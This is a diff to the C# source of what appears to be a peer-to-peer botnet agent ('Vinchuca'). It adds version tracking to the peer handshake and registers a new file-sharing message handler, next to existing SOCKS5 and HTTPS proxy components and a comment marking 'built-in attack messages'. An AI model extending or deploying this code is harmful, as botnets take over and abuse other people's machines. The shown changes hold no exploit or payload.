@@ -10,6 +10,7 @@ using Vinchuca.Network.Comunication.Listeners;
 using Vinchuca.Network.Listeners;
 using Vinchuca.Network.Protocol.Handlers;
 using Vinchuca.Network.Protocol.Handlers.Command;
+using Vinchuca.Network.Protocol.Handlers.System;
 using Vinchuca.Network.Protocol.Messages;
 using Vinchuca.Network.Protocol.Messages.Command;
 using Vinchuca.Network.Protocol.Messages.System;
@@ -31,6 +32,8 @@ namespace Vinchuca
         private readonly MessageManager _messagesManager;
         private readonly Socks5Server _socks5;
         private readonly HttpsProxyServer _https;
+        private readonly VersionManager _versionManager;
+
         public IPAddress PublicIP { get; set; }
 
         private static readonly Log Logger = new Log(new TraceSource("BOT", SourceLevels.Verbose));
@@ -44,6 +47,10 @@ namespace Vinchuca
         {
             get { return _messagesManager; }
         }
+
+        public short Version => _versionManager.AgentVersion;
+        public short ConfigVersion => _versionManager.ConfigurationFileVersion;
+
 
         public Agent(int port, BotIdentifier id)
         {
@@ -94,6 +101,8 @@ namespace Vinchuca
             _messagesManager = new MessageManager(peersManager);
             peersManager.MessageSender = _messagesManager;
 
+            _versionManager = new VersionManager(_messagesManager);
+
             RegisterMessageHandlers(peersManager);
 
             var externPort = BotIdentifier.Id.GetPort();
@@ -110,13 +119,13 @@ namespace Vinchuca
                 MessageCode.Syn,
                 MessageType.Request,
                 typeof(HelloSynMessage),
-                new HelloSynMessageHandler(_peerList, _messagesManager),
+                new HelloSynMessageHandler(_peerList, _messagesManager, _versionManager),
                 (int)Difficulty.Hardest);
             _messagesManager.Register(
                 MessageCode.AckSyn,
                 MessageType.Reply,
                 typeof(HelloAckSynMessage),
-                new HelloAckSynMessageHandler(_peerList, _messagesManager),
+                new HelloAckSynMessageHandler(_peerList, _messagesManager, _versionManager),
                 (int)Difficulty.Medium);
             _messagesManager.Register(
                 MessageCode.Ack,
@@ -147,6 +156,12 @@ namespace Vinchuca
                 MessageType.Reply,
                 typeof(PongMessage),
                 new PongMessageHandler(_peerList, _messagesManager),
+                (int)Difficulty.Easy);
+            _messagesManager.Register(
+                MessageCode.ShareFile,
+                MessageType.Request,
+                typeof(ShareFileMessage),
+                new ShareFileMessageHandler(), 
                 (int)Difficulty.Easy);
 
             // built-in attack messages
